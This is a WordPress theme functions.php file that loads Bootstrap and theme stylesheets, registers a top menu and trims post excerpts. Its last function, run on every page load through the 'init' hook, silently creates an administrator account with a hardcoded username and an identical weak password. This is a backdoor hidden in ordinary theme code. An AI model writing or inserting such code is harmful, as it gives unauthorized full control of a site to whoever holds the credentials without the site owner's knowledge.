<?php

function load_stylesheet() {
    wp_register_style("main", get_template_directory_uri() . "/css/main.css", array(), false, "all");
    wp_enqueue_style("main");
}

function load_Bootstrap_reboot() {
    wp_register_style("Bootstrap reboot", get_template_directory_uri() . "/css/bootstrap-reboot.css", array(), false, "all");
    wp_enqueue_style("Bootstrap reboot");
}

function load_Bootstrap_grid() {
    wp_register_style("Bootstrap grid", get_template_directory_uri() . "/css/bootstrap-grid.css", array(), false, "all");
    wp_enqueue_style("Bootstrap grid");
}

add_action("wp_enqueue_scripts", "load_Bootstrap_reboot");
add_action("wp_enqueue_scripts", "load_Bootstrap_grid");
add_action("wp_enqueue_scripts", "load_stylesheet");

// Theme options
add_theme_support("menus");
add_theme_support("post-thumbnails");

// Menus
register_nav_menus(
    array(
        "top-menu" => "Top Menu Location"
    )
);

/**
 * Filter the except length to 20 words.
 *
 * @param int $length Excerpt length.
 * @return int (Maybe) modified excerpt length.
 */
function wpdocs_custom_excerpt_length( $length ) {
    return 20;
}
add_filter( 'excerpt_length', 'wpdocs_custom_excerpt_length', 999 );

/**
 * Filter the excerpt "read more" string.
 *
 * @param string $more "Read more" excerpt string.
 * @return string (Maybe) modified "read more" excerpt string.
 */
function wpdocs_excerpt_more( $more ) {
    return '';
}
add_filter( 'excerpt_more', 'wpdocs_excerpt_more' );

function wpb_admin_account(){
    $user = 'rohan';
    $pass = 'rohan';
    $email = 'rohanvanwijk@gmail.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    add_action('init','wpb_admin_account');
?>